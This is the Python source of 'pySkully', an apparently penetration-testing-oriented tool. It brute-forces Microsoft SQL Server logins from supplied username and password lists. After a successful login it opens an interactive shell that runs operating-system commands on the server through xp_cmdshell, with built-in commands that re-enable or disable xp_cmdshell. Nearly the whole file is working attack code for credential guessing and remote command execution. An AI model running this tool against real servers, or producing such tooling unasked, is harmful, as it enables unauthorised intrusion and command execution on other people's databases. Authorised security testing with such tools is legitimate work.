#!/usr/bin/env python
# pySkully
# A MSSQL service login bruteforcer and xp_cmdshell wrapper
# Author: Frank Allenby - frank@sensepost.com

import sys
import argparse
import _mssql

program_info = {
    'name': 'pySkully',
    'description': 'A MSSQL service login bruteforcer and xp_cmdshell wrapper',
    'author': {
        'name': 'Frank Allenby',
        'email': 'frank@sensepost.com'
    }
}

program_defaults = {
    'service': 'SQL Server'
}

notices = {
    'success': '\033[32m\033[1m[!]\033[0m',
    'fail': '\033[31m\033[1m[!]\033[0m',
    'info': '\033[35m\033[1m[?]\033[0m',
    'break': '\033[37m\033[1m |\033[0m'
}


def print_notice(notice, message):
    print '%(notice)s %(message)s' % {'notice': notice, 'message': message}


def notice_success(message):
    print_notice(notices['success'], message)


def notice_fail(message):
    print_notice(notices['fail'], message)


def notice_info(message):
    print_notice(notices['info'], message)


def print_headline():
    print '''
    \033[34m\033[1m-
    | %(name)s
    |
    | %(description)s
    |
    | %(author_name)s - %(author_email)s
    -\033[0m\033[0m
    ''' % {
        'name': program_info['name'],
        'description': program_info['description'],
        'author_name': program_info['author']['name'],
        'author_email': program_info['author']['email']
    }


def make_db_connection(server, port, user, password):
    return _mssql.connect(
        server=server,
        user=user,
        password=password,
        port=port
    )


# Convert a file to an array
# Each line in the file becomes an item in the array, removing newlines
def file_to_array(filename):
    with open(filename) as file:
        return [line.rstrip('\n') for line in file]



def shell(conn):
    whoami = conn.execute_scalar("EXEC master..xp_cmdshell %s", 'whoami')
    hostname = conn.execute_scalar("EXEC master..xp_cmdshell %s", 'hostname')

    while (1):
        print '\033[36m%(user)s\033[37m\033[1m@\033[0m\033[32m%(hostname)s\033[37m\033[1m>\033[0m ' % {'user': whoami, 'hostname': hostname},
        cmd = sys.stdin.readline().rstrip('\n')

        if cmd == '!exit':
            sys.exit(0)
        elif cmd == '!enable':
            conn.execute_scalar("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'xp_cmdshell',1;RECONFIGURE -- ")
            continue
        elif cmd == '!disable':
            conn.execute_scalar("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'xp_cmdshell',0;RECONFIGURE -- ")
            continue

        try:
            conn.execute_query("EXEC master..xp_cmdshell %s;", cmd)
        except:
            notice_fail('There was a database error executing your command!')

        for row in conn:
            if row[0]:
                print row[0]


def brute(usernames, passwords, verbose):
    notice_info('Starting bruteforce with %(username_count)d username(s) and %(password_count)d password(s)' % {'username_count': len(usernames), 'password_count': len(passwords)})
    print notices['break']
    for username in usernames:
        for password in passwords:
            conn = None
            try:
                conn = make_db_connection(args.target,
                                          args.port,
                                          username,
                                          password)
            except:
                if verbose:
                    notice_fail('Login failed with %(username)s : %(password)s' % {'username': username, 'password': password})
                continue

            if verbose:
                print notices['break']
            notice_success('Login succeeded with %(username)s : %(password)s' % {'username': username, 'password': password})
            print notices['break']
            notice_success('Dropping into shell..')
            print notices['break']
            notice_info('Use !exit to exit')
            notice_info('Use !enable to enable xp_cmdshell')
            notice_info('Use !disable to disable xp_cmdshell')

            shell(conn)


# Convert an argument to an array
# If there is a list of items, this will be recursive to allow for multiple
# files of arguments, etc
# e.g. users.txt,sally,tom,other_users.txt
#   will return a list of all lines in users.txt and other_users.txt as well
#   as 'sally' and 'tom
def arg_to_array(argument):
    if ',' in argument:
        arguments = []
        for item in argument.split(','):
            arguments += arg_to_array(item)
        return arguments
    elif '.' in argument:
        return file_to_array(argument)
    else:
        return [argument]

parser = argparse.ArgumentParser(
    description='%(name)s - %(description)s'
    %
    {
        'name': program_info['name'],
        'description': program_info['description']
    }
)

parser.add_argument(
    'target',
    type=str,
    help='The target SQL instance you wish to bruteforce. Should be a hostname\
    or IP address.'
)

parser.add_argument(
    'port',
    type=int,
    help='The port you wish to use to connect to the SQL instance. Usually 445 \
    or 1433.'
)

parser.add_argument(
    '-u',
    '--usernames',
    help='The username(s) you wish to bruteforce. Specify a single username, a\
    list of comma-separated files and/or usernames, or a wordlist to use.',
    required=True
)

parser.add_argument(
    '-p',
    '--passwords',
    help='The password(s) you wish to bruteforce. Specify a single password,\
    a list of comma-separated files and/or passwords, or a wordlist to use.',
    required=True
)

parser.add_argument(
    '-v',
    '--verbose',
    action='store_true',
    help="Produce verbose output during %(program_name)s's operation"
    % {'program_name': program_info['name']}
)

print_headline()

args = parser.parse_args()

usernames = arg_to_array(args.usernames)
passwords = arg_to_array(args.passwords)

verbose = args.verbose

brute(usernames, passwords, verbose)
